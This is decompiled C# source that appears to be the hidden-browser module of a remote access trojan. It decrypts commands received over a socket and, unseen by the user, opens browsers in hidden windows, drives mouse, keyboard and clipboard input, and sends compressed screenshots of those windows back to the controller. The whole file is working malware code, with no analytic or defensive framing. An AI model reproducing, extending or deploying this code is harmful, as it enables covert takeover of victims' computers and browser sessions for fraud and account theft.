using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using HB.Handle;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace HBrowser
{
	// Token: 0x02000009 RID: 9
	public class Messages
	{
		// Token: 0x0600002F RID: 47 RVA: 0x0000379C File Offset: 0x0000199C
		public static void Read(byte[] b)
		{
			try
			{
				string[] array = Strings.Split(Helper.BS(Helper.AES_Decryptor(b)), Conversions.ToString(Settings.SPL), -1, CompareMethod.Binary);
				string text = array[0] ?? "";
				string text2 = text;
				uint num = <PrivateImplementationDetails>.ComputeStringHash(text2);
				if (num <= 2373523467U)
				{
					if (num <= 1094353996U)
					{
						if (num <= 473188771U)
						{
							if (num != 395326401U)
							{
								if (num == 473188771U)
								{
									if (text2 == "OpenBrowser")
									{
										string text3 = array[1];
										string customName = array[2];
										string titleCustomOpen = array[3];
										int width = Convert.ToInt32(array[4]);
										int height = Convert.ToInt32(array[5]);
										string text4 = GetWindowsHidden.RetrunBrowser(text3, customName, titleCustomOpen);
										bool flag = !string.IsNullOrEmpty(text4) && GetWindowsHidden.GetHandleBrowser(text4, width, height);
										if (flag)
										{
											GetWindowsHidden.GetListWindow();
											Helper.MsgLogs(text3 + "Browser is prepared to control incognito.");
										}
										else
										{
											Helper.MsgLogs("Window is not found - " + text3);
										}
									}
								}
							}
							else if (text2 == "Resize")
							{
								int x = Convert.ToInt32(array[1]);
								int y = Convert.ToInt32(array[2]);
								bool flag2 = GetWindowsHidden.WindowCheck(Helper.WindowrActive);
								if (flag2)
								{
									GetWindowsHidden.ResizeWondow(Helper.WindowrActive, x, y);
								}
							}
						}
						else if (num != 882099452U)
						{
							if (num == 1094353996U)
							{
								if (text2 == "keyboardClick")
								{
									HandleMouse.KeyboardDown(array[1]);
								}
							}
						}
						else if (text2 == "LeftDown")
						{
							int x2 = Convert.ToInt32(array[1]);
							int y2 = Convert.ToInt32(array[2]);
							HandleMouse.MouseLeftDown(x2, y2);
						}
					}
					else if (num <= 2268276213U)
					{
						if (num != 2120177073U)
						{
							if (num == 2268276213U)
							{
								if (text2 == "RightDown")
								{
									int x3 = Convert.ToInt32(array[1]);
									int y3 = Convert.ToInt32(array[2]);
									HandleMouse.MouseRightDown(x3, y3);
								}
							}
						}
						else if (text2 == "ScrollUp")
						{
							Helper.ScrollUp();
						}
					}
					else if (num != 2354392742U)
					{
						if (num == 2373523467U)
						{
							if (text2 == "CloseHBrowser")
							{
								try
								{
									int x4 = Convert.ToInt32(array[1]);
									int y4 = Convert.ToInt32(array[2]);
									GetWindowsHidden.ClearList(x4, y4);
								}
								catch
								{
								}
								ClientSocket.isDisconnected();
							}
						}
					}
					else if (text2 == "MoveCursor")
					{
						int x5 = Convert.ToInt32(array[1]);
						int y5 = Convert.ToInt32(array[2]);
						HandleMouse.MouseMove(x5, y5);
					}
				}
				else if (num <= 3604478976U)
				{
					if (num <= 3448155331U)
					{
						if (num != 3017121218U)
						{
							if (num == 3448155331U)
							{
								if (text2 == "Close")
								{
									string str = array[1];
									int num2 = Convert.ToInt32(array[2]);
									int num3 = Convert.ToInt32(array[3]);
									int num4 = Convert.ToInt32(array[4]);
									bool flag3 = GetWindowsHidden.InitializingWindow(num2, num3, num4);
									if (flag3)
									{
										GetWindowsHidden.WindowClose(GetWindowsHidden.ListBrowser[num2], num3, num4);
										GetWindowsHidden.GetListWindow();
									}
									else
									{
										Helper.MsgLogs("Failed to close the window - " + str);
									}
								}
							}
						}
						else if (text2 == "HBrowser+")
						{
							Helper.Resize = false;
							try
							{
								bool flag4 = GetWindowsHidden.WindowCheck(Helper.WindowrActive);
								if (flag4)
								{
									Bitmap bitmap = ScreenshotCapture.CaptureWindow(Helper.WindowrActive);
									using (Helper.Appsstream = new MemoryStream())
									{
										EncoderParameter encoderParameter = new EncoderParameter(Encoder.Quality, (long)Convert.ToInt32(array[1]));
										ImageCodecInfo encoderInfo = Helper.GetEncoderInfo("image/jpeg");
										EncoderParameters encoderParameters = new EncoderParameters(1);
										encoderParameters.Param[0] = encoderParameter;
										bitmap.Save(Helper.Appsstream, encoderInfo, encoderParameters);
										ClientSocket.Send(string.Concat(new string[]
										{
											"HBrowser+",
											Settings.SPL,
											Settings.IDD,
											Settings.SPL,
											Convert.ToBase64String(Helper.Compress(Helper.Appsstream.ToArray()))
										}));
										if (encoderParameters != null)
										{
											encoderParameters.Dispose();
										}
										if (bitmap != null)
										{
											bitmap.Dispose();
										}
									}
								}
								else
								{
									ClientSocket.Send("HBrowser+" + Settings.SPL + Settings.IDD + Settings.SPL);
								}
							}
							catch
							{
							}
						}
					}
					else if (num != 3569528248U)
					{
						if (num == 3604478976U)
						{
							if (text2 == "RightUp")
							{
								int x6 = Convert.ToInt32(array[1]);
								int y6 = Convert.ToInt32(array[2]);
								HandleMouse.MouseRghitUp(x6, y6);
							}
						}
					}
					else if (text2 == "ScrollDown")
					{
						Helper.ScrollDown();
					}
				}
				else if (num <= 3816728765U)
				{
					if (num != 3738506984U)
					{
						if (num == 3816728765U)
						{
							if (text2 == "LeftUp")
							{
								int x7 = Convert.ToInt32(array[1]);
								int y7 = Convert.ToInt32(array[2]);
								HandleMouse.MouseLeftUp(x7, y7);
							}
						}
					}
					else if (text2 == "paste")
					{
						HandleClipboard.Paste(array[1]);
					}
				}
				else if (num != 3824293811U)
				{
					if (num == 3979322188U)
					{
						if (text2 == "GetHWND")
						{
							string text5 = array[1];
							int num5 = Convert.ToInt32(array[2]);
							int width2 = Convert.ToInt32(array[3]);
							int height2 = Convert.ToInt32(array[4]);
							bool flag5 = GetWindowsHidden.InitializingWindow(num5, width2, height2);
							if (flag5)
							{
								Helper.WindowrActive = GetWindowsHidden.ListBrowser[num5];
								Helper.MsgLogs(text5 + " window is ready");
							}
							else
							{
								Helper.MsgLogs("Window is not found - " + text5);
							}
						}
					}
				}
				else if (text2 == "UpdateWindowsActive")
				{
					GetWindowsHidden.GetListWindow();
				}
			}
			catch (Exception ex)
			{
				Helper.MsgLogs("Error! " + ex.Message);
			}
		}
	}
}
